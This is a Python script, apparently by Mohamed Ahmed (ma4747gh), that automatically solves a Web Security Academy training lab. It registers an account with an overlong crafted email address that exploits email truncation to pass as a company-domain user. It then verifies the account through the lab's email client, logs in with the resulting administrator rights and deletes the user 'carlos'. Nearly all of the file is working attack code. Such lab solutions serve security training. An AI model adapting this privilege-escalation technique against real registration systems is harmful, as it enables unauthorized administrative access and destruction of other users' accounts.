import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.email_client = None

    def get_csrf_token(self, path):
        response = self.session.get(self.lab_url + path)
        return re.search('value="(.*)"', response.text).group(1)

    def register_new_account(self):
        response = self.session.get(self.lab_url)
        self.email_client = re.findall(r'<a id=\'exploit-link\' class=\'button\' target=\'_blank\' '
                                       r'href=\'(.*)\'', response.text)[0]
        data = {
            'csrf': self.get_csrf_token('register'),
            'username': 'hacker',
            'email': 'a'*238 + '@dontwannacry.com' + '.' + self.email_client.split('/')[2],
            'password': 'Password123@'
        }
        self.session.post(self.lab_url + 'register', data=data)

    def verify_new_account(self):
        response = self.session.get(self.email_client)
        verification_email = re.findall(r'(https://.*\.web-security-academy.net'
                                        r'/register\?temp-registration-token=.*)\'', response.text)[0]
        self.session.get(verification_email)

    def sign_in_as_administrator_and_delete_carlos(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'hacker',
            'password': 'Password123@'
        }
        self.session.post(self.lab_url + 'login', data=data)
        self.session.get(self.lab_url + 'admin/delete?username=carlos')

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.register_new_account()
        self.verify_new_account()
        self.sign_in_as_administrator_and_delete_carlos()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
